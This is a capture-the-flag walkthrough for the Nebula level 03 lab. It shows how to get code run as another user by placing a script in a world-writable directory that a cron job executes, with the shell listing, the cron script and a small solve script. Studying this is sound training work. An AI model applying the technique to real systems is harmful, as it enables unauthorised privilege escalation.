# Challenge
Exploit the crontab running in the home directory of flag03.

Challenge Link: https://exploit.education/nebula/level-03/

# Solution
The problem statement tells us to look in the home directory of flag03 so let's do that first.
```shell
level03@nebula:~$ ls -l /home/flag03/
drwxrwxrwx 2 flag03 flag03  3 2023-08-18 05:24 writable.d
-rwxr-xr-x 1 flag03 flag03 98 2011-11-20 21:22 writable.sh
level03@nebula:~$ ls -l /home/flag03/writable.d
total 0
level03@nebula:~$ cat /home/flag03/writable.sh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
    (ulimit -t 5; bash -x "$i")
    rm -f "$i"
done
```

We have an empty directory called `writable.d` and a script called `writable.sh`. The script appears to run whatever bash scripts it finds in the `writable.d` directory before removing them. We can guess that the cron job is running this script. In that case, let's write a script for the cron job to run and place it in the `writeable.d` directory.

solve.sh
```shell
#!/bin/bash
getflag > /home/flag03/solved.txt
```

Wait a couple minutes and we can see `solved.txt` in `/home/flag03/`.
```shell
level03@nebula:~$ ls /home/flag03/
solved.txt writable.d writable.sh
level03@nebula:~$ cat /home/flag03/solved.txt
You have successfully executed getflag on a target account
```

Success! We have solved level03.

The cron job ran the `writable.sh` script which ran our script. Our script ran `getflag` and redirected the output to a text file in our home directory (otherwise we wouldn't have been able to see the output).

# Further Reading
For some reading on cron jobs, I like this resource: [Understanding Crontab in Linux with Examples](https://linuxhandbook.com/crontab/)
